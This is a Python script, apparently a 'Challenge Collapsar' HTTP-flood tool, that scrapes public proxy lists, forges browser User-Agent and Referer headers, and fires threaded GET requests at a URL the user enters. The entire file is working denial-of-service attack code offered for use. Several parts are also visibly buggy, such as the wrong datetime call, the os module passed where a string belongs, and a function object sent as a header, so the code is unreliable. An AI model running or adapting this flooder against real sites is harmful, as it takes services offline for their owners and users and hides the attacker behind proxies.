import requests     
import re
import os
import random
import threading 
import time
import datetime
import sys

Choice=random.choice 
referers = [
	"https://www.google.com/search?q=",
	"https://check-host.net/",
	"https://www.facebook.com/",
	"https://www.youtube.com/",
	"https://www.fbi.com/",
	"https://www.bing.com/search?q=",
	"https://r.search.yahoo.com/",
	"https://www.cia.gov/index.html",
	"https://vk.com/profile.php?redirect=",
	"https://www.usatoday.com/search/results?q=",
	"https://help.baidu.com/searchResult?keywords=",
	"https://steamcommunity.com/market/search?q=",
	"https://www.ted.com/search?q=",
	"https://play.google.com/store/search?q=",
]
def getuseragent():
    browser=random.choice(['chrome', 'firefox', 'ie'])
    os_list=[['68K', 'PPC', 'Intel Mac OS X'],\
             ['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'],\
             ['Linux i686', 'Linux x86_64']]
    random.choice(os_list[random.randint(0,2)])
    if browser == 'chrome':
        webkit = str(random.randint(500, 599))
        version = str(random.randint(0, 99)) + '.0' + str(random.randint(0, 9999)) + '.' + str(random.randint(0, 999))
        return 'Mozilla/5.0 (%s) AppleWebKit/%s.0 (KHTML, like Gecko) Chrome/%s Safari/%s'%(os,webkit,version,webkit)
    elif browser == 'firefox':
        month,day= random.randint(1, 12),random.randint(1, 30)
        gecko = str(random.randint(2020, datetime.datetime.date.today().year))+['0%s'%month if month<10 else str(month)][0]+['0%s'%day if day<10 else str(day)][0]
        version = str(random.randint(1, 72)) + '.0'
        return 'Mozilla/5.0 (%s; rv:%s) Gecko/%s Firefox/%s'%(os,version,gecko,version)
    elif browser == 'ie':
        if random.randint(0,1):
            token=random.choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
        else:
            token=''
        return 'Mozilla/5.0 (compatible; MSIE %s; %s; %sTrident/%s)'%((random.randint(1, 99))+'.0',os,token,(random.randint(1, 99))+'.0')

def block(size,out_str = ''):
    for _ in range(0, size):
        out_str += chr(random.randint(65, 90))
    return(out_str)

def cc(): 
    global pro_count
    headers = {
        'User-Agent':str(getuseragent),
        'Connection':'Keep-Alive',
        'Cache-Control':'no-cache',
        'Referer':random.choice(referers) + block(size=random.randint(5,10)),
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        'access-control-allow-headers': 'DNT, Keep-Alive, User-Agent, X-Reque'
        }
    try:
        requests.get(url = url,headers=headers,proxies=proxies_list[pro_count],timeout=10)
        sys.stdout.write("[*] Thread<"+str(pro_count)+">\r")
    except Exception as e:
        print(f"[*]Error>{e}")

 

def get_html(url):
    user_agent_list = ["Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) Gecko/20100101 Firefox/61.0",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15"

        ]
    headers = {'User-Agent':random.choice(user_agent_list)}
    response = requests.get(url=url, headers=headers)
    data_html = response.text
    return data_html

def parse_data(data_html):
    p=r'(\d*\.\d*\.\d*\.\d*:\d*)'
    info_list=re.findall(p,data_html)
    return info_list

def get_proxies():
    proxies_list=[]
    for url in ["https://zj.v.api.aa1.cn/api/proxyip/","https://www.proxy-list.download/api/v1/get?type=socks4"]:
        host=parse_data(get_html(url))
        for i in range(0,len(host)-1):
            proxies_list.append({"HTTP":"http://%s/"%host[i],"HTTPS":"https://%s/"%host[i]})
    print("[*]>Get %s proxies"%len(proxies_list))
    return (proxies_list)

def st():
    global pro_count
    for pro_count in range(0,count-1):
        time.sleep(delay/1000)
        threading.Thread(target=cc).start()

if __name__ == "__main__": 
    print("""
   ____________   ___   __  __             __ 
  / ____/ ____/  /   | / /_/ /_____ ______/ /_
 / /   / /      / /| |/ __/ __/ __ `/ ___/ __/
/ /___/ /___   / ___ / /_/ /_/ /_/ / /__/ /_
\____/\____/  /_/  |_\__/\__/\__,_/\___/\__/

github:https://github.com/None20/Challenge-Collapsar
""")
    url=input("> URL:")
    delay=input("> Delay(default=0 ms):")
    delay=[int(delay) if delay!='' else 0][0]
    print("[*]>Ready to setup")
    proxies_list=get_proxies()
    print("[*]>Setup completed")
    count=len(proxies_list)
    print("[*]>Start attact")
    for i in range(2):
        threading.Thread(target=st).start()
